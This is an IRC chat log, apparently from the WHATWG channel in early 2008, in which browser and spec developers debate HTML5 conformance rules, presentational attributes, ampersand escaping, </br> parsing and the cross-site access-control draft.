
[14:03:01.0000] <jwalden>
it's pretty horked in Firefox too

[14:03:02.0000] <webben_>
MSDN is amazingly broken most of the time even in newer versions of their own browser

[14:03:03.0000] <jwalden>
parts of the page blanked out corresponding to their dropdown menus?

[14:03:04.0000] <webben_>
/me remembers struggling to read it in IE7 Beta

[14:04:00.0000] <jwalden>
if that's what it is, hovering to open them and then moving off to close usually fixes it for me

[14:04:01.0000] <SadEagle>
It works in konq when identifying as firefox... but nor normally

[14:06:00.0000] <Philip`>
It probably doesn't help that one of their CSS files is an HTML page saying "Sorry, we were unable to service your request." as text/css

[14:06:01.0000] <jwalden>
har har

[14:08:00.0000] <webben_>
/me just wishes they'd fix it; it's a massively useful source they've made incredibly difficult to use

[14:10:00.0000] <Philip`>
In Opera it just has no stylesheets

[14:10:01.0000] <Philip`>
I've got no idea where Firefox is getting its stylesheet content from, though

[14:12:00.0000] <SadEagle>
Philip`: does whatever opera you do support getters/setters?

[14:13:00.0000] <roc>
i hear the silverlight version is going to be awesome

[14:15:00.0000] <webben_>
/me would just like a plain HTML search and a plain HTML output format.

[14:15:01.0000] <jwalden>
yeah, MSDN's going to be really flashy -- sorry, Silverlight-y -- when they get that out

[14:17:00.0000] <Philip`>
SadEagle: I think it doesn't

[14:17:01.0000] <Philip`>
(since it's Opera 9.2)

[14:19:00.0000] <Dashiva>
msdn looks (relatively) good in 9.5

[14:19:01.0000] <Dashiva>
Not bad in 9.2 either, really

[14:19:02.0000] <Dashiva>
Sure, the top text is above the top of the screen, but nobody uses that text anyhow :)

[15:11:00.0000] <Philip`>
/me 's parser now can handle comments and <span>

[15:11:01.0000] <Philip`>
(but not </span> yet)


2008-02-05
[16:29:00.0000] <annevk>
Hixie, you around?

[16:50:00.0000] <jwalden>
weep: https://bugzilla.mozilla.org/attachment.cgi?id=301408&action=diff

[16:51:00.0000] <annevk>
thanks for not changing the API completely :)

[16:51:01.0000] <annevk>
move from document to window was already slightly annoying, though justified

[16:52:00.0000] <jwalden>
I have difficulty believing we'd have changed the API

[16:52:01.0000] <jwalden>
I'm not sure what would have been done, to be honest

[16:53:00.0000] <jwalden>
manually adding the method at runtime is gross

[16:53:01.0000] <annevk>
brendan suggested changing the name

[16:53:02.0000] <jwalden>
I think there'd have been enough pushback for that not to happen

[16:55:00.0000] <jwalden>
we need to get away from this ABI compat thing, pronto

[16:55:01.0000] <gavin>
annevk: he suggested changing the method name in our code, and exposing it to content using JS API trickery

[16:55:02.0000] <gavin>
he wasn't suggesting we change the API...

[16:55:03.0000] <annevk>
my bad, i inferred that from other comments

[16:59:00.0000] <annevk>
gavin, then again, are you sure?

[16:59:01.0000] <annevk>
oh well, doesn't matter

[17:00:00.0000] <gavin>
yes, I'm sure

[17:00:01.0000] <gavin>
he was talking about implementation details to avoid the bustage

[17:01:00.0000] <annevk>
why did he cc hixie then and why did jonas reply the way he did?

[17:02:00.0000] <gavin>
I think sicking misunderstood

[17:02:01.0000] <gavin>
and I think he CCed Hixie just to point out the conflict

[17:03:00.0000] <gavin>
(and perhaps they had discussed Windows macros before or something)

[17:08:00.0000] <jwalden>
in all honesty, I kinda think it's not a bad idea to avoid name conflicts

[17:08:01.0000] <jwalden>
witness cssFloat for example

[17:09:00.0000] <jwalden>
although I'm worried doing so for a Windows API would set a bad precedent

[17:09:01.0000] <jwalden>
and I don't think it matters now anyway

[17:10:00.0000] <jwalden>
/me wishes push_macro and pop_macro functionality were built into the standards

[17:11:00.0000] <jwalden>
since people do that sort of thing so much anyway

[17:11:01.0000] <annevk>
cssFloat, className

[17:11:02.0000] <annevk>
there are some others

[17:13:00.0000] <Dashiva>
Speaking of cssFloat, is that being standardized?

[17:13:01.0000] <annevk>
i think it's part of DOM2Style

[17:14:00.0000] <Hixie>
Philip`: re creating an element for a token and re the login box, please send mail, i'm ooo for a few days

[17:14:01.0000] <Dashiva>
I was thinking more if IE had made any hints about adding support

[17:15:00.0000] <annevk>
Chris Wilson edited that spec, ask him ;)

[17:15:01.0000] <annevk>
Hixie, he did

[17:16:00.0000] <annevk>
Hixie, though if you could outline your position on the slash business with access control before you're ooo that'd be nice

[17:16:01.0000] <annevk>
s/though//

[17:16:02.0000] <Hixie>
i'll be back wednesday

[17:16:03.0000] <Hixie>
(i'm already ooo, just checking in from the hotel)

[17:16:04.0000] <Hixie>
what's the issue?

[17:16:05.0000] <annevk>
i'd like to know why add a slash at the end

[17:16:06.0000] <annevk>
and then remove it later on when doing the actual request

[17:17:00.0000] <annevk>
(prepending a slash instead of resolving against the current URI is also slightly unclear)

[17:17:01.0000] <Hixie>
oh that's just to make sure that you don't treat /foo.txt as being able to set the rules for /foo.txt.other/file

[17:18:00.0000] <jwalden>
Dashiva: it's in acid3 :-)

[17:19:00.0000] <Dashiva>
Ooh, that's probably as good a guarantee as it gets

[17:19:01.0000] <jwalden>
which is about as much magical pixie dust as can be applied to the problem, externally

[17:19:02.0000] <annevk>
Hixie, thanks

[17:20:00.0000] <annevk>
Hixie, I guess I'll draft something up and we'll see what needs changing

[17:21:00.0000] <Hixie>
cool

[17:21:01.0000] <annevk>
hopefully done by Wednesday :)

[17:21:02.0000] <Hixie>
fwiw i got several people send me private feedback about that proposal saying it solved their only concerns with the spec

[17:21:03.0000] <Hixie>
people from google, that is

[17:22:00.0000] <annevk>
at least one of them said so on the list

[17:22:01.0000] <Hixie>
who i'd guess will be amongst the first people to do any large-scale work with this :-)

[17:22:02.0000] <Hixie>
yeah, indeed

[17:22:03.0000] <annevk>
good good

[17:22:04.0000] <annevk>
time for bed now :)

[17:22:05.0000] <othermaciej>
is this the access-control spec?

[17:22:06.0000] <annevk>
ttyl

[17:23:00.0000] <annevk>
othermaciej, yeah, though I'm leaving now; questions -> e-mail

[17:23:01.0000] <othermaciej>
I don't have any other questions

[17:38:00.0000] <jwalden>
<https://bugzilla.mozilla.org/show_bug.cgi?id=387706#c61> clarifies brendan's thoughts, fwiw (wasn't suggesting a rename)

[00:41:00.0000] <hsivonen>
http://crisp.tweakblogs.net/blog/455/the-road-to-html5-conformance-of-html4-documents.html

[00:43:00.0000] <zcorpan_>
the first fragment would be conforming with the old rules since ul is struct-inline... but then no-one would understand the old rules anyway

[00:46:00.0000] <zcorpan_>
/me notes that the article refers to error numbers

[00:49:00.0000] <zcorpan_>
if we were to allow unescaped ampersands, then we'd still want to catch stuff like &1234; and &and;

[00:50:00.0000] <Hixie_>
&this and that; ?

[00:50:01.0000] <zcorpan_>
i'm not sure we want to allow unescaped ampersands at all

[00:50:02.0000] <Hixie_>
it's clear that people don't care about the requirement when it comes to href="" attributes

[00:50:03.0000] <Hixie_>
where commas are rare and ampersands frequent

[00:50:04.0000] <Hixie_>
er, semicolons

[00:51:00.0000] <Hixie_>
and so long as no semicolon occurs between the & and the =, which is author-controlled, i don't see that there could be a problem, really

[00:52:00.0000] <zcorpan_>
right, but it's easy to make mistakes if you don't escape ampersands, since &copy=... is replaced with ©

[00:53:00.0000] <Hixie_>
not in attributes, is it?

[00:53:01.0000] <zcorpan_>
it is

[00:53:02.0000] <zcorpan_>
but perhaps we should add = to the [a-zA-Z0-9] check

[00:54:00.0000] <zcorpan_>
and then allow unescaped ampersands but only in attributes

[00:55:00.0000] <Hixie_>
i thought we'd established that in attributes, you always needed a semicolon

[00:55:01.0000] <Hixie_>
maybe i remember wrong

[00:55:02.0000] <zcorpan_>
only if the next character is a-zA-Z0-9

[00:58:00.0000] <zcorpan_>
ha! http://www.sitepoint.com/forums/showthread.php?p=3693559#post3693559 is the first i've seen that <p><table> parsing would actually break

[00:58:01.0000] <hsivonen>
Hixie_: when replying to Jim Correia, I noticed that the obsolete-happiness of HTML5 undermines the argument that everyone should trust we don't need versioning for validation going to HTML5 + 1.

[00:58:02.0000] <Hixie_>
why?

[00:59:00.0000] <Hixie_>
zcorpan_: ah

[00:59:01.0000] <Hixie_>
zcorpan_: well

[00:59:02.0000] <Hixie_>
zcorpan_: then i don't know what to do

[00:59:03.0000] <Hixie_>
zcorpan_: i agree it would be nice if everyone added semicolons... but they don't

[00:59:04.0000] <zcorpan_>
Hixie_: indeed

[00:59:05.0000] <hsivonen>
Hixie_: the non-versioning story goes that when HTML6 is out, people just start using HTML6 conformance checking

[01:00:00.0000] <Hixie_>
zcorpan_: so i'm not sure whether we're helping anyone by being pedantic about it

[01:00:01.0000] <Hixie_>
hsivonen: right

[01:00:02.0000] <hsivonen>
Hixie_: but for that to happen, HTML6 mustn't disrupt their authoring practices

[01:00:03.0000] <Hixie_>
hsivonen: or must do so in a way that only improves the web, right

[01:00:04.0000] <hsivonen>
Hixie_: why should they believe that when HTML5 does disrupt things by obsoleting Transitional stuff?

[01:01:00.0000] <Hixie_>
hsivonen: obsoleting stuff today that was marked for obsoletion 10 years ago should not come as a surprise to anyone.

[01:01:01.0000] <zcorpan_>
Hixie_: consider this. you're a cms dev and write a cms that doesn't escape ampersands in attributes

[01:01:02.0000] <zcorpan_>
Hixie_: you test it and it works fine and you ship

[01:01:03.0000] <Hixie_>
hsivonen: if people are still stuck in the mid-90s, they need to be informed.

[01:01:04.0000] <zcorpan_>
Hixie_: one day a user complains that his link doesn't work

[01:01:05.0000] <zcorpan_>
Hixie_: because it contained &copy=

[01:01:06.0000] <hsivonen>
Hixie_: in practice, the real world lives in Transitional--not Strict

[01:01:07.0000] <hsivonen>
Hixie_: the Transition never came

[01:02:00.0000] <Hixie_>
hsivonen: it's coming now.

[01:02:01.0000] <hsivonen>
Hixie_: the issue is that people disagree on what "only improves the Web"

[01:03:00.0000] <zcorpan_>
Hixie_: s/test/validate and test/

[01:03:01.0000] <hsivonen>
I'd rather see authors spend their time on improving the Web instead of firefighting border='0' copy-paste snippets

[01:04:00.0000] <othermaciej>
document conformance is hard because there's less at stake

[01:04:01.0000] <Hixie_>
hsivonen: sure. but that's different from <font>, bgcolor=, align=, etc.

[01:04:02.0000] <othermaciej>
because people can publish nonconforming documents and there isn't really a problem

[01:04:03.0000] <othermaciej>
so there's always the temptation to be paternalistic

[01:04:04.0000] <hsivonen>
Hixie_: I think obsoleting align on th and td doesn't improve the Web

[01:05:00.0000] <Hixie_>
i think making markup minimal and moving to all css improves the web dramatically

[01:05:01.0000] <hsivonen>
Hixie_: fwiw, I wouldn't take Transitional wholesale. I want to get rid of <basefont> and <isindex>, for example.

[01:05:02.0000] <Hixie_>
both in terms of performance and reuse.

[01:06:00.0000] <Hixie_>
hsivonen: i think that allowing media-specific markup is giving a very wrong message at a time where author are slowly learning the right way.

[01:06:01.0000] <hsivonen>
Hixie_: if we cared about performance enough to use it as an excuse to ban border='0', we should ban comments for consistency

[01:07:00.0000] <hsivonen>
and liberal use of whitespace

[01:07:01.0000] <Hixie_>
hsivonen: i would be more inclined to go back up the slippery slope and remove /> and xmlns="" than i would be to add align="".

[01:08:00.0000] <hsivonen>
Hixie_: alignment of table cells is conceptually often dependent on the kind of content but Selectors cannot do AI-based matching on the nature of element content

[01:08:01.0000] <hsivonen>
Hixie_: so letting the author set alignment is the simplest solution

[01:09:00.0000] <hsivonen>
Hixie_: I don't see what good it would do if authors had to use class='number' instead of align='right'

[01:09:01.0000] <zcorpan_>
perhaps allow only align=right on <td> and make it mean "number"

[01:10:00.0000] <hsivonen>
zcorpan_: what if you want to right-align ths that are column heads for numbers?

[01:10:01.0000] <Hixie_>
hsivonen: just put the class on the table and then use css to set the align on the relevant cells

[01:10:02.0000] <zcorpan_>
hsivonen: ok, <th> too, meaning that this is a header for a column of only numbers

[01:11:00.0000] <hsivonen>
Hixie_: what kind of GUI do you envision for writing those selectors?

[01:11:01.0000] <Hixie_>
hsivonen: emacs

[01:11:02.0000] <hsivonen>
Hixie_: would my mother who uses dreamweaver be better off if she had to tweak CSS to content instead of using a pre-designed style sheet?

[01:12:00.0000] <hsivonen>
Hixie_: I think the pro-CSS principle goes wrong if the authors has to tweak CSS to particular content and a pre-designed style sheet won't work

[01:13:00.0000] <hsivonen>
Hixie_: stuff that changes on a case-by-case basis like image dimensions and cell alignment should be settable in HTML

[01:14:00.0000] <hsivonen>
Hixie_: with HTML 4.01 Transitional for contextual stuff, I haven't had to add stuff to the style sheet my mother uses in years

[01:14:01.0000] <Hixie_>
i disagree. i think it's quite reasonable for a wysiwyg editor to work out what rules are necessary to get the desired effect, and i think the incremental rendering argument for img height/width is ok, but the per-image argument is moot

[01:15:00.0000] <othermaciej>
hsivonen: for tables (proper data tables at least) the main thing missing is column styling, which in theory should be offered but in practice has been too thorny to implement

[01:16:00.0000] <othermaciej>
(it's rare for alignment to be something tweaked per-cell, but it applies more often to a whole row than a whole column)

[01:16:01.0000] <hsivonen>
othermaciej: true

[01:16:02.0000] <othermaciej>
er, I meant that the other way around

[01:16:03.0000] <hsivonen>
othermaciej: but the point is moot until CSS delivers column styling and top browsers implement it

[01:17:00.0000] <hsivonen>
othermaciej: until then, authors need to deal with the current per-cell aligment

[01:18:00.0000] <Hixie_>
well, html5 won't be done for years, maybe someone can get something done in css by then

[01:18:01.0000] <hsivonen>
Hixie_: have you used Word with autostyles enabled? the user experience becomes horrible, when the editor tries to guess styling rules and adds a level of indirection by guessing

[01:19:00.0000] <Hixie_>
(i've long proposed [#col=3] and similar)

[01:19:01.0000] <Hixie_>
hsivonen: that's not what i'm suggesting

[01:19:02.0000] <othermaciej>
it's too bad tables are row-major instead of column-major, in retrospect the other way would be better for styling

[01:20:00.0000] <hsivonen>
Hixie_: adding an ID and an # selector doesn't really solve something that authors need solved. I think HTML5 should just let go of the strict non-presentationalism principle 

[01:21:00.0000] <hsivonen>
Hixie_: or what are you suggesting when you say the editor should work out the rules?

[01:21:01.0000] <Hixie_>
hsivonen: if the user sets all the cells of one column to one type of alignment, it's trivial to come up with a single rule for that with no classes and no IDs, or maybe one class if there are multiple tables.

[01:22:00.0000] <hsivonen>
Hixie_: is it trivial to round-trip such a rule without editor-specific annotations and have the rule reasonbly editable in GUI?

[01:23:00.0000] <zcorpan_>
<table><style>...</style><tr>... ?

[01:23:01.0000] <hsivonen>
Hixie_: CSS isn't threatened if we allow so pragmatic presentationalism in HTML. The extremism isn't pragmatic.

[01:23:02.0000] <Hixie_>
nothing is trivial when it comes to wysiwyg editing

[01:24:00.0000] <hsivonen>
zcorpan_: great for legacy parsing...

[01:24:01.0000] <Hixie_>
i don't think css is threatened even by xhtml transitional

[01:24:02.0000] <zcorpan_>
hsivonen: indeed

[01:24:03.0000] <Hixie_>
that's not the concern

[01:24:04.0000] <hsivonen>
Hixie_: what's the concern?

[01:24:05.0000] <Hixie_>
<        Hixie_> i think making markup minimal and moving to all css improves the web dramatically <        Hixie_> both in terms of performance and reuse.

[01:25:00.0000] <hsivonen>
Hixie_: performance is a red herring if you allow comments at the same time

[01:25:01.0000] <Hixie_>
why?

[01:25:02.0000] <Hixie_>
comments are near zero-cost

[01:25:03.0000] <hsivonen>
Hixie_: and reuse is something that authors need to grow to want instead of some from above forcing it

[01:25:04.0000] <Hixie_>
not author reuse

[01:25:05.0000] <Hixie_>
user reuse

[01:25:06.0000] <hsivonen>
Hixie_: are you referring other than bandwidth performance?

[01:26:00.0000] <Hixie_>
"mashup", as some people call it

[01:26:01.0000] <Hixie_>
i mean performance throughout the stack

[01:26:02.0000] <hsivonen>
Hixie_: wouldn't align on table cells make alignment that is coupled with the nature of content travel better?

[01:26:03.0000] <Hixie_>
from rendering, to scripting, to editing, to comprehension and maintenance

[01:27:00.0000] <hsivonen>
Hixie_: do you have quatitative data showing that align on cell performs worse that elaborate selectors? 

[01:27:01.0000] <hsivonen>
than

[01:28:00.0000] <Hixie_>
nope

[01:28:01.0000] <Hixie_>
(at least, no hard data at hand.)

[01:28:02.0000] <othermaciej>
from my experience, it's pretty unlikely that it would perform better on the client side

[01:28:03.0000] <othermaciej>
presentational attributes are much easier to handle than elaborate selectors

[01:29:00.0000] <hsivonen>
othermaciej: that's what my intuition tells me

[01:29:01.0000] <othermaciej>
that's not to say this is a reason in itself to encourage presentational attributes

[01:30:00.0000] <hsivonen>
Hixie_: as for maintenance, since aligment is coupled with cell content, contextual attributes make more maintenance sense than elaborate (and brittle!) selectors stored at a distance

[01:30:01.0000] <othermaciej>
on the other hand align on table cells seems to be very much a special case

[01:30:02.0000] <othermaciej>
mainly due to lack of usable column styling

[01:30:03.0000] <Hixie_>
hsivonen: i think you are assuming a world where <td align> is used just for saying "this is a number", and i think in practice that this is far from what it is used for.

[01:31:00.0000] <franksalim>
you're just talking about the align attribute, not inline styling of table cells, right?

[01:31:01.0000] <othermaciej>
so one wouldn't want to go down the slippery slope to <p align> or other stuff like that

[01:31:02.0000] <hsivonen>
franksalim: I'm talking about align='right'

[01:31:03.0000] <hsivonen>
othermaciej: I don't want align on p or div

[01:31:04.0000] <franksalim>
hsivonen: i don't understand the necessity of preserving that

[01:31:05.0000] <zcorpan_>
Hixie_: same goes with <table> being used for data tables...

[01:32:00.0000] <Hixie_>
othermaciej: we're already going down that slope. hence my comment earlier that arguments like this are more likely to see me go back _up_ the slope and remove /> and xmlns="", than they are to see me go further down the slope with adding img border=0, td align="", etc.

[01:32:01.0000] <othermaciej>
 /> and xmlns="" aren't really in the same category

[01:33:00.0000] <othermaciej>
those are pointless talismans that make chameleon markup theoretically possible for the joy of those who care about such things

[01:33:01.0000] <othermaciej>
not presentational markup

[01:33:02.0000] <Lachy>
border=0 certainly isn't needed.  That can be handled by a fairly simple selector: a img, img[usemap] { border:0 }

[01:33:03.0000] <Hixie_>
nor are img border=0 and td align=right compared to, say, style="" or <font>.

[01:33:04.0000] <othermaciej>
<td align> is more analogous to <b> and <i>

[01:33:05.0000] <Hixie_>
there are a number of categories

[01:33:06.0000] <zcorpan_>
Lachy: img { border:0 }

[01:34:00.0000] <zcorpan_>
othermaciej: indeed

[01:34:01.0000] <hsivonen>
Lachy: the point of allowing border='0' is to save people the trouble of getting rid of it again, and again, and again

[01:34:02.0000] <othermaciej>
though I don't think the case is as strong for <td align> as for <b>

[01:34:03.0000] <Lachy>
for cell alignment, I generally use class names on each table cell that needs special styling, and then style them all at once using a class selector

[01:35:00.0000] <Hixie_>
hsivonen: i want people to get rid of it.

[01:35:01.0000] <hsivonen>
Lachy: how is that more noble than <span class='italic'> to avoid <i>?

[01:35:02.0000] <Lachy>
hsivonen, it's more work to put border=0 on each img, than it is to put a single rule in a reusable stylesheet

[01:35:03.0000] <Hixie_>
othermaciej: for <b>, i can see how we can define it in a completely non-presentational manner quite legitimately.

[01:35:04.0000] <Hixie_>
same with <i>

[01:36:00.0000] <hsivonen>
Lachy: I'm not suggesting that people write border='0'. I'm suggesting that we don't ask people to delete it when a tool or a cute badge template put it in the markup

[01:36:01.0000] <Hixie_>
so how do we catch new authors writing it?

[01:36:02.0000] <othermaciej>
so is this because Gecko puts borders around images in links by default?

[01:37:00.0000] <Hixie_>
that's the problem transitional never solved

[01:37:01.0000] <hsivonen>
othermaciej: Mosaic, Netscape, Gecko, ...

[01:38:00.0000] <Lachy>
hsivonen, I'd rather discourage tools and pre-written templates to omit it

[01:38:01.0000] <hsivonen>
Hixie_: Cathing them isn't that important. it is a relatively benign cargo cult.

[01:38:02.0000] <hsivonen>
Lachy: good luck

[01:38:03.0000] <hsivonen>
Catching even

[01:38:04.0000] <hsivonen>
actually, it isn't quite a cargo cult, since it actually works

[01:39:00.0000] <hsivonen>
border='0' actually makes planes land

[01:39:01.0000] <othermaciej>
Gecko should just get rid of the default border

[01:39:02.0000] <hsivonen>
othermaciej: I agree

[01:39:03.0000] <hsivonen>
othermaciej: but that doesn't fix the legacy templates, habits and tools

[01:40:00.0000] <Hixie>
hold on brb

[01:40:01.0000] <othermaciej>
(I wonder if there's a bug?)

[01:41:00.0000] <hsivonen>
othermaciej: I couldn't find one yesterday

[01:41:01.0000] <othermaciej>
hsivonen: yes, 5-10 years after they ship a version of Firefox that does that people might stop including the border='0'

[01:41:02.0000] <Lachy>
othermaciej, does webkit use a border?

[01:41:03.0000] <hsivonen>
othermaciej: right, so during that time, is it good use of human time to keep hunting instances of border='0'?

[01:41:04.0000] <Hixie>
hsivonen: i think catching it is important, because it's one of many things (like align=right, and />, and xmlns="") that litters the web and for which the web would be a better place without

[01:41:05.0000] <othermaciej>
Lachy: no

[01:42:00.0000] <Lachy>
ok. So it's just IE and FF

[01:42:01.0000] <othermaciej>
IE does it too?

[01:42:02.0000] <othermaciej>
(IE/Mac doesn't)

[01:42:03.0000] <Lachy>
IE/win does

[01:43:00.0000] <hsivonen>
:-(

[01:43:01.0000] <othermaciej>
I wonder if anyone has ever filed a bug about lack of this behavior in WebKit

[01:43:02.0000] <hsivonen>
Hixie: I think the cost of improving the Web on this particular point is unfavorable compared to the expected improvement

[01:44:00.0000] <Lachy>
I wonder if IE could drop it for IE8 in all modes?

[01:44:01.0000] <hsivonen>
Lachy: if they don't for the IE 5.5 mode, copy-pasteable snippets will continue to have border='0' or, worse, style='border:0'

[01:45:00.0000] <Hixie>
hsivonen: i think that the cost of having an unclear message (you can have border, but only if it is 0, and only on img, not on table, and you can have align=right on td but not on col and not on p...)

[01:45:01.0000] <Hixie>
hsivonen: is way higher

[01:47:00.0000] <hsivonen>
Hixie: I'm not convinced that authors think of image border and table border or p and td align as the same things

[01:48:00.0000] <Hixie>
i'm not convinced of the opposite :-)

[01:48:01.0000] <Hixie>
sadly, you control the validator, and i control the spec, so we're at somewhat of an impass :-P

[01:48:02.0000] <hsivonen>
does any client really appreciate the theoretical difference of content-language and lang=''? http://www.w3.org/International/questions/qa-http-and-lang

[01:50:00.0000] <Lachy>
hsivonen, I think the more important question is does any client do anything useful with either?

[01:50:01.0000] <hsivonen>
Lachy: pre-Pango Gecko at least did something useful with lang

[01:50:02.0000] <hsivonen>
Lachy: albeit, theorists didn't like what it did

[01:50:03.0000] <hsivonen>
(font selection)

[01:51:00.0000] <othermaciej>
Lachy: seems pretty clear Microsoft wouldn't drop the border for IE5.5 mode or IE7 mode

[01:51:01.0000] <hsivonen>
obviously, http-equive='content-language' doesn't help with conneg, so the conneg meaning does not matter

[01:55:00.0000] <annevk>
they all affect :lang()

[01:56:00.0000] <annevk>
ooh, mediawiki at the W3C: http://www.w3.org/2008/webapps/wiki/Main_Page

[01:58:00.0000] <hsivonen>
and so PHP tools replace Python tools...

[01:58:01.0000] <hsivonen>
worse is better, I guess

[02:01:00.0000] <roc>
we still use lang/xml:lang as part of the font selection process

[02:02:00.0000] <othermaciej>
if anyone is still curious...

[02:02:01.0000] <othermaciej>
we do have a bug filed for lacking a border on broken images, but no such bug as far as I can tell for link images

[02:03:00.0000] <Hixie>
"With browser vendors tripping all over themselves to implement draft modules from the CSS3, HTML5 and XHTML2 specifications, the first wave of web standards is drawing to a close."

[02:03:01.0000] <Hixie>
browser vendors doing _what_?

[02:03:02.0000] <Hixie>
http://blogs.pathf.com/agileajax/2008/02/web-standards-w.html

[02:03:03.0000] <roc>
two out of three ain't bad

[02:27:00.0000] <takkaria>
also makes reference to WC3

[02:28:00.0000] <hsivonen>
/me smiles at the paragraph starting with "That's not how fanatics see it, however."

[02:47:00.0000] <annevk>
zcorpan_, http://forums.whatwg.org/viewtopic.php?t=143 is spam

[03:32:00.0000] <zcorpan_>
annevk: thanks

[03:37:00.0000] <Philip`>
Hmm, </br clear=left> is like <br clear=left> in Opera, but like <br> in IE (and is ignored in FF/Safari)

[03:40:00.0000] <zcorpan_>
Philip`: also in 9.5?

[03:41:00.0000] <zcorpan_>
(try quirks mode for fx/saf)

[03:43:00.0000] <Philip`>
Ah - FF2-quirks does it like <br>, Safari-quirks still ignores it

[03:43:01.0000] <Philip`>
and O9.5 does it like <br>

[03:43:02.0000] <annevk>
and HTML5 does that too?

[03:44:00.0000] <zcorpan_>
annevk: yeah

[03:44:01.0000] <annevk>
good good

[03:44:02.0000] <Philip`>
"An end tag whose tag name is "br"   Parse error. Act as if a start tag token with the tag name "br" had been seen. Ignore the end tag token."

[03:44:03.0000] <Philip`>
I guess it's implicit that the generated token has no attributes

[03:44:04.0000] <zcorpan_>
that's how i read it anyway

[03:45:00.0000] <zcorpan_>
since the attributes are attached to the token that is ignored

[03:45:01.0000] <Philip`>
A start tag token corresponding to <br foo=bar> satisfies the explicit condition of being a start tag token with the tag name "br"

[03:47:00.0000] <zcorpan_>
the spec has lots of "act as if a start tag token with...", but it could be clarified that such tokens have no attributes

[03:47:01.0000] <Philip`>
Might just be a waste of time, though

[03:47:02.0000] <hsivonen>
looks like the Opera 9.5 approach to MathML can't deal with http://golem.ph.utexas.edu/~distler/blog/archives/001594.html

[03:47:03.0000] <annevk>
if it's not said explicitly that it has attributes it should've none

[03:47:04.0000] <annevk>
that's how specs work

[03:48:00.0000] <Philip`>
annevk: Is it specified anywhere that that's how specs work?

[03:48:01.0000] <hsivonen>
do both v.nu and html5lib do the right thing already with the current spec wording?

[03:48:02.0000] <annevk>
Philip`, I'm not sure how explicit it is that doing something that the specification does not explicitly forbid is non-conforming

[03:49:00.0000] <annevk>
Philip`, but it's pretty much agreed upon that inserting random attributes during full moon is wrong

[03:49:01.0000] <hsivonen>
Philip`: speccing how specs work reminds me of "entity-escaped HTML in RSS <title>

[03:49:02.0000] <annevk>
hsivonen, I think html5lib does </br> correctly

[03:50:00.0000] <annevk>
not sure how many tests we have for that though

[03:50:01.0000] <Philip`>
hsivonen: Both do

[03:50:02.0000] <hsivonen>
ok

[04:08:00.0000] <annevk>
hmm, IETF got media types messed up: http://www.ietf.org/rfc/rfc3986

[04:09:00.0000] <hsivonen>
server config is hard

[04:10:00.0000] <annevk>
I don't disagree

[04:10:01.0000] <franksalim>
lets go shopping

[04:12:00.0000] <franksalim>
sorry i was a little bit slow there. call and response joke, right?

[04:14:00.0000] <annevk>
i guess i'm slow too, because I don't get it :)

[04:15:00.0000] <Philip`>
http://en.wikipedia.org/wiki/Barbie#Controversies

[04:16:00.0000] <hsivonen>
http://diveintomark.org/archives/2004/07/06/tough

[04:18:00.0000] <annevk>
hehe

[04:18:01.0000] <annevk>
I found markp's post funny the first time I read it, I didn't know they actually made talking Barbies

[04:19:00.0000] <gsnedders>
hsivonen: peh. it's not hard in RSS! you just check whether it has anything that looks like an end tag (without attributes) or an entity and if it has either, treat it as HTML :P

[04:21:00.0000] <gsnedders>
annevk: do browsers return the last header if you request Content-Type (or something else relevant to the protocol) and there are multiple headers of the type? What if there are occurrences of the header in the trailer of a chunked response?

[04:21:01.0000] <annevk>
/me tries to make access control more friendly to lots of non-GET methods to lots of different URIs on the same domain

[04:22:00.0000] <annevk>
gsnedders, no clue

[04:22:01.0000] <gsnedders>
heh.

[04:23:00.0000] <annevk>
the method check result cache will now become slightly more complicated

[04:23:01.0000] <annevk>
is there anything in non-writing that has two mutually exclusive primary keys?

[04:24:00.0000] <annevk>
plus one primary key that is consistent throughout...

[05:08:00.0000] <zcorpan_>
http://www.w3.org/TR/wai-aria/

[05:08:01.0000] <zcorpan_>
hmm, i'm not in acks

[05:09:00.0000] <annevk>
was that the plan?

[05:09:01.0000] <annevk>
:)

[05:09:02.0000] <annevk>
it still has 'xmlns:aria="http://www.w3.org/2005/07/aaa"'...

[05:10:00.0000] <annevk>
and lots of RDF and OWL crap

[05:10:01.0000] <zcorpan_>
indeed

[05:10:02.0000] <annevk>
"java script snippet :"

[05:10:03.0000] <zcorpan_>
there are lots of known issues

[05:11:00.0000] <zcorpan_>
but it's getting there

[05:12:00.0000] <annevk>
I see

[05:12:01.0000] <annevk>
your draft was so much better

[05:13:00.0000] <zcorpan_>
implementing my spec makes you conform to the other, i think :)

[05:15:00.0000] <annevk>
still seems highly suboptimal

[05:15:01.0000] <hsivonen>
does the RDF in appendix 7.1.1 embody the data contained in the tables earlier in the document?

[05:16:00.0000] <zcorpan_>
hsivonen: no idea

[05:17:00.0000] <zcorpan_>
annevk: feel free to send feedback

[05:18:00.0000] <hsivonen>
the RDF schema is surprisingly short

[05:18:01.0000] <annevk>
zcorpan_, k...

[05:18:02.0000] <annevk>
/me makes access control even more complicated first

[05:19:00.0000] <annevk>
with access control QA teams can rejoice as they'll be guaranteed with work for the coming decade

[05:19:01.0000] <hsivonen>
is the RDF schema under the Document License or the Software License?

[05:20:00.0000] <zcorpan_>
annevk: so *that's* why you're working on access control ;)

[05:20:01.0000] <zcorpan_>
hsivonen: the document conformance criteria are wrong at this point

[05:21:00.0000] <zcorpan_>
hsivonen: that was pointed out but not fixed before publication

[05:21:01.0000] <zcorpan_>
(dunno about the license though)

[05:22:00.0000] <hsivonen>
zcorpan_: ok. I'm looking for reasonably machine-readable copyright-wise unencumbered data about what the roles are, what states and properties apply to which roles and the datatypes of the states/properties

[05:22:01.0000] <hsivonen>
Document License being encumbered but Software License or MIT license being unencumbered

[05:24:00.0000] <hsivonen>
though the RDF schema is so small after all, that perhaps typing a RELAX NG schema is simpler than writing a converter

[05:25:00.0000] <annevk>
zcorpan_, ssh

[05:26:00.0000] <annevk>
the access control spec will three-level deep <dl>

[05:26:01.0000] <annevk>
will feature

[05:26:02.0000] <zcorpan_>
annevk: sounds like a table?

[05:27:00.0000] <zcorpan_>
or nested state machines?

[05:30:00.0000] <annevk>
nested state machines

[05:31:00.0000] <annevk>
i hope it looks reasonable when styled

[05:31:01.0000] <Philip`>
/me thinks there should be a machine-readable way of describing state machines like that, which can get converted into human-readable spec text

[05:32:00.0000] <annevk>
some people prefer models rather than this, but I'm unsure how to write them down accurately

[05:32:01.0000] <Philip`>
(I'd particularly like that since it'd save me the work of converting the human-readable text into a machine-readable form...)

[05:32:02.0000] <annevk>
my state machines don't exactly map to code straigh away

[05:33:00.0000] <annevk>
at least not the code we write nowadays

[05:33:01.0000] <Philip`>
/me now supports comments, non-special start tags and non-special end tags in his OCaml HTML5 parser

[05:34:00.0000] <Philip`>
